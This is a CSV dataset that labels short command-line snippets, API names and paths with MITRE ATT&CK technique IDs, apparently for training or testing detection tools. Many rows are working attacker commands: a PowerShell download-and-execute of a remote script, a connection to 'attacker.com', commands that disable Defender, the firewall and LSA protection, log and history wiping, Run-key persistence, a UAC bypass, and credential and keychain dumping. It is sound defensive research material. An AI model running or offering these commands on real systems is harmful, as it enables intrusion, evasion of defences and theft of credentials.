command,mitre_id
"""PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe"" --pipe 4",T1559
regsvr32.exe /u /s {PATH:.dll},T1218
DYLD_FRAMEWORK_PATH,T1574
%USERPROFILE%\AppData\Roaming,T1074
net config workstation,T1016
cat /etc/pam.d/passwd,T1201
return $files,T1005
"'@ -OutputAssembly ""$executable_filepath""",T1036
GetHostByName,T1106
if [ -f /etc/issue ]; then cat /etc/issue >> $output_file; fi,T1082
squirrel.exe --download {REMOTEURL},T1218
HKLM\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\NullSessionPipes,T1112
Get-ComputerInfo,T1082
C:\ProgramData\Initech\Initech.exe /run,T1547
[System.GC]::Collect(),T1204
dir c:\ >> %temp%\download,T1083
systemctl stop ufw,T1562
"rmdir %temp%\lolbin /s /q 2>nul & mkdir ""%temp%\lolbin\Windows Media Player"" & copy C:\Windows\System32\calc.exe ""%temp%\lolbin\Windows Media Player\wmpnscfg.exe"" >nul && cmd /V /C ""set ""ProgramW6432=%temp%\lolbin"" && unregmp2.exe /HideWMP""",T1202
"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v NetWire /t REG_SZ /d ""C:\Users\admin\AppData\Roaming\Install\Host.exe"" /f",T1112
cd $test_folder; touch a b c d e f g,T1560
"t:connect(""attacker.com"",12345);",T1059
try { $myT1036_003 = (Start-Process -PassThru -FilePath $outputfile).Id },T1036
copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y,T1036
conhost.exe --headless calc.exe,T1564
"schtasks /Run /TN ""EventViewerBypass""",T1053
"reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",T1546
exiftool -description -W /path/to/output-file --filename /path/to/input-file,T1222
if (-Not (Test-Path -Path $folderPath)) {,T1105
kinit,T1558
Select * From Win32_PingStatus where Address = 'mil.gov.ua',T1047
"$env:AWS_PROFILE = ""$aws_profile""",T1567
pfctl -a pf-rules -s rules,T1562
net view /domain,T1018
Dll,T1553
cmd /c c:\temp\PsExec.exe -accepteula -j -d -s [Target Binary],T1569
tshark -c 5 -i $interface,T1040
"file(""/path/to/input-file"")",T1005
"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}",T1218
chown root /tmp/hello,T1548
~/Library/.DS_Stores/,T1564
rpmverify --eval '%{lua:...}',T1548
"if [ -x ""$(command -v arp)"" ]; then arp -a; else echo ""arp is missing from the machine. skipping...""; fi;",T1016
Stop-Service -Name $service_name,T1562
xattr,T1564
"New-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType ""String"" -Force",T1562
makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab,T1564
"echo ""*** Log Group Created ***""",T1562
"InfDefaultInstall.exe ""$inf_to_execute""",T1218
LVM_SETITEMPOSITION,T1055
route print,T1016
.ssh,T1005
"net group ""$group"" ""$username"" /add /domain",T1136
.Md5.exe,T1497
"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,",T1218
timeout 20,T1497
Invoke-DOSfucation,T1027
xattr -d com.apple.quarantine,T1553
"net group ""domain admins"" /domain",T1069
C:\log.txt,T1056
"Local = ""$($_.LocalAddress):$($_.LocalPort)""",T1049
CreateRemoteThread,T1055
wmic process list /FORMAT:evil[.]xsl,T1220
killall 'Google Chrome',T1539
ZwSetValueKey(),T1543
/.local/share/keyrings,T1555
"BlobName = """"",T1619
echo before,T1547
"echo ""$at_command"" | at $time_spec",T1053
crontab -l > /tmp/notevil,T1053
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",T1562
($Users = Get-AzureADUser -All $true) > $null,T1110
rlwrap /bin/sh,T1059
"import-module ""PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1""",T1059
%APPDATA%\updater.exe -Command exit,T1574
print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe},T1564
WinAPI,T1106
ksshell -i /path/to/input-file,T1005
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType $command_line_switch_type -EncodedCommandParamVariation $encoded_command_param_variation -UseEncodedArguments -EncodedArgumentsParamVariation $encoded_arguments_param_variation -Execute -ErrorAction Stop,T1059
reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg,T1564
hxxp://google.com@1157586937,T1566
tasklist.exe | findstr /i cylance,T1518
"echo ""flag2"" > $flagPath2",T1137
mypy /path/to/input-file --junit-xml /path/to/output-file,T1222
"Start-Process -FilePath ""C:\Temp\ExternalPayloads\PCHunter_free\$pchunter64_exe""",T1057
"Write-Host ""64-bit Office""",T1137
"Set-ItemProperty ""HKCU:\software\classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""$executable_binary"" -Force",T1548
ProcessList,T1057
version.dll,T1574
C:\Windows\System32\AtBroker.exe,T1546
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'),T1082
HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum,T1680
cat $Out_Filepath,T1555
dscl . -create /Users/AtomicUser UserShell /bin/bash,T1078
GetCurrentDirectoryW,T1106
Remove-Item (Get-PSReadlineOption).HistorySavePath,T1070
"Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",T1518
"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f",T1546
getST.py,T1558
echo DATA >output-file,T1222
"Get-ChildItem -Path ""$SitePackages"" | Where-Object { $_.Name -like ""*.pth"" }",T1546
"[DllImport(""user32.dll"", CharSet=CharSet.Auto)]",T1491
InvocationMethod = '$invocation_method',T1218
provlaunch.exe LOLBin,T1218
wmic useraccount get /ALL,T1033
if (!(Test-Path -path $path)){,T1546
tar -cvzf $output_file $input_file_folder,T1560
"if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo ""Virtualization Environment detected""; fi;",T1497
"""reg"" add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f",T1562
if [ -d /var/audit ] ; then sudo rm -rf $macos_audit_path ; fi,T1070
az ad user list,T1087
wmic group get name,T1069
$cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];,T1132
$requiredGraphAccess.ResourceAppId = $graphSP.AppId,T1098
script -q -c '# DATA' /path/to/output-file,T1222
"{if($user.$prop -like ""*password*"")",T1552
acr -r ./relative/path/to/temp-file,T1059
schtasks /query /S $target.$domain,T1558
shred -u $file_to_shred,T1070
ChangeServiceConfig,T1543
"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,",T1218
"New-ItemProperty -Path ""HKLM:\Software\Microsoft\Command Processor"" -Name ""AutoRun"" -Value ""$command"" -PropertyType ""String""",T1546
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f",T1562
"$wc.DownloadFile($url, $imgLocation)",T1491
%TEMP%\result2.dat,T1074
sqldumper.exe 540 0 0x01100:40,T1003
New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki,T1564
Platypus,T1480
IActiveScriptParseProcedure32,T1012
CreateIoCompletionPort(),T1486
SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfileGloballyOpenPorts\\List,T1112
C:\\Users\\Public\\Libraries\\record.txt,T1074
patch.dll,T1036
cmp /path/to/input-file /dev/zero -b -l,T1005
ZwProtectVirtualMemory,T1106
cmd.exe /c systeminfo,T1082
"New-ItemProperty -Path HKCU:\Environment -Name ""COR_PROFILER_PATH"" -PropertyType String -Value ""$file_name"" -Force | Out-Null",T1574
ServiceDll,T1505
which_python=`which python || which python3`,T1560
"[ ""$(uname)"" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art",T1059
MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll},T1218
oci.dll,T1574
"python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())""",T1140
msdtc.exe,T1036
EnvironmentVariables,T1547
"if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi",T1562
"sudo lsmod | grep -i ""vboxsf\|vboxguest""",T1082
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f",T1490
ngen.exe {REMOTEURL},T1105
"php -r '$r=array(); exec(""/path/to/command"", $r); print(join(""\n"",$r));'",T1059
tccd,T1548
public class TokenAdjuster {,T1562
AutoUpdater.js,T1036
net user art-test $password,T1078
apt install xclip -y,T1115
"copy ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" $env:temp",T1569
security dump-keychain –d,T1555
LoadLibraryA(),T1106
pandoc -t plain /path/to/input-file,T1005
{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1},T1546
/System/Library/LaunchDaemons,T1053
if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;,T1543
Remove-Item $teamviewer_log_file -Force -ErrorAction Ignore,T1070
[System.Reflection.Assembly]::Load,T1620
"""$file_name""",T1562
ctrl+c,T1546
Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force,T1217
"curl -s -A ""*<|>*"" -m3 $domain",T1071
f:write(d);,T1105
MpCmdRun.exe -DownloadFile -url $remote_file -path $local_path,T1105
minicom -D /dev/null -S /path/to/temp-file,T1059
"cd ""$env:PathToAtomicsFolder\T1555.003\bin""",T1555
getent shadow,T1548
